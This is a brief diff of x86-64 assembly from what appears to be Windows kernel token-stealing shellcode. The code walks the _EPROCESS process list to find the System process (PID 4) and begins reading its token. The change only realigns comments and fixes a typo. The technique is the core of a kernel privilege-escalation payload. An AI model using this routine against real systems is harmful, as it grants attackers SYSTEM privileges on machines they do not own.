@@ -108,10 +108,10 @@ find_process:
     mov r9, SYS_PID
 
 next_system_process:
-    mov r8, [r8+ACTIVE_PROCESS_LINKS]             ; We dereference the Flink in to r8
-    sub r8, ACTIVE_PROCESS_LINKS                  ; We subtract the offset to get the address of the next _EPROCESS
-    cmp [r8+UNIQUE_PROCESS_ID], r9                ; We check the process ID (looking for 4 = System)
-    jnz next_system_process                       ; if not then loop back to dereference th enext Flink
+    mov r8, [r8+ACTIVE_PROCESS_LINKS]    ; We dereference the Flink in to r8
+    sub r8, ACTIVE_PROCESS_LINKS         ; We subtract the offset to get the address of the next _EPROCESS
+    cmp [r8+UNIQUE_PROCESS_ID], r9       ; We check the process ID (looking for 4 = System)
+    jnz next_system_process              ; if not then loop back to dereference the next Flink
 
 found_system_process:
     mov rcx, [r8+TOKEN] 
